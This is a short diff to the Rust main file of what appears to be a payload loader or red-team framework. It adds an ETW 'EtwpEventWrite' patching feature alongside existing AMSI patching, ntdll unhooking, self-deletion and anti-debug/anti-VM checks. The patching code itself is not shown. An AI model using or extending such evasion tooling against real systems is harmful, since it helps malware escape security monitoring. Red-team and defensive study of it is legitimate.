@@ -12,7 +12,7 @@ mod benign;
 #[cfg(any(feature = "CheckAntiDebugProcessDebugFlags", feature = "CheckAntiDebugSystemDebugControl", feature = "CheckAntiDebugRemoteDebugger", feature = "CheckAntiDebugNtGlobalFlag", feature = "CheckAntiDebugProcessList", feature = "CheckAntiDebugHardwareBreakpoints", feature = "CheckAntiVMCPU", feature = "CheckAntiVMRAM", feature = "CheckAntiVMUSB", feature = "CheckAntiVMProcesses", feature = "CheckAntiVMHyperV", feature = "CheckDomainJoined"))]
 mod checks;
 
-#[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple", feature = "EvasionNtdllUnhooking", feature = "EvasionAMSIHwbp", feature = "EvasionSelfDeletion", feature = "EvasionETWWinAPI"))]
+#[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple", feature = "EvasionNtdllUnhooking", feature = "EvasionAMSIHwbp", feature = "EvasionSelfDeletion", feature = "EvasionETWWinAPI", feature = "EvasionETWpEventWrite"))]
 mod evasion;
 
 // AES encryption support
@@ -29,7 +29,7 @@ mod args;
 const ENCPAYLOAD: &[u8] = &[];
 
 /// Run all enabled evasion techniques
-#[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple", feature = "EvasionNtdllUnhooking", feature = "EvasionAMSIHwbp", feature = "EvasionETWWinAPI"))]
+#[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple", feature = "EvasionNtdllUnhooking", feature = "EvasionAMSIHwbp", feature = "EvasionETWWinAPI", feature = "EvasionETWpEventWrite"))]
 fn run_evasion_techniques() {
     #[cfg(feature = "EvasionNtdllUnhooking")]
     {
@@ -55,6 +55,11 @@ fn run_evasion_techniques() {
     {
         let _ = evasion::etw::patch_etw_write_functions_start(evasion::etw::Patch::PatchEtwEventWrite);
         let _ = evasion::etw::patch_etw_write_functions_start(evasion::etw::Patch::PatchEtwEventWriteFull);
+    }
+
+    #[cfg(feature = "EvasionETWpEventWrite")]
+    {
+        let _ = evasion::etw::patch_etwp_event_write_full_start();
     }
 
     #[cfg(feature = "EvasionSelfDeletion")]
@@ -83,7 +88,7 @@ fn main() {
     // =======================================================================
     // Evasion techniques
     // =======================================================================
-    #[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple", feature = "EvasionNtdllUnhooking", feature = "EvasionAMSIHwbp", feature = "EvasionETWWinAPI"))]
+    #[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple", feature = "EvasionNtdllUnhooking", feature = "EvasionAMSIHwbp", feature = "EvasionETWWinAPI", feature = "EvasionETWpEventWrite"))]
     run_evasion_techniques();
 
     // =======================================================================
